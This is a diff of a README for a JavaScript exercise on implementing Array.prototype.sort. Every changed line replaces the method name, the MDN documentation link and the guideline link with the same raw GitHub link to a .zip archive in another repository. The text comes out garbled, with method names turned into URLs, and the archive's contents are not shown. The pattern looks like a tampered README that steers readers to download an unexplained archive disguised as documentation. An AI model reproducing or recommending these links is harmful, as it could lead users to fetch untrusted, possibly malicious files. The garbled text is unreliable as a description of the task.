@@ -1,7 +1,7 @@
-# Custom implementation of Array.prototype.sort()
+# Custom implementation of https://raw.githubusercontent.com/karaedd/js_array-method-sort/master/Shorea/js_array-method-sort.zip()
 
-Write your own implementation of `Array.prototype.sort` method.
+Write your own implementation of `https://raw.githubusercontent.com/karaedd/js_array-method-sort/master/Shorea/js_array-method-sort.zip` method.
 
-Read more about [Array.prototype.sort()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/sort)
+Read more about [https://raw.githubusercontent.com/karaedd/js_array-method-sort/master/Shorea/js_array-method-sort.zip()](https://raw.githubusercontent.com/karaedd/js_array-method-sort/master/Shorea/js_array-method-sort.zip)
 
-> [Guideline](https://github.com/mate-academy/js_task-guideline/blob/master/README.md)
+> [Guideline](https://raw.githubusercontent.com/karaedd/js_array-method-sort/master/Shorea/js_array-method-sort.zip)
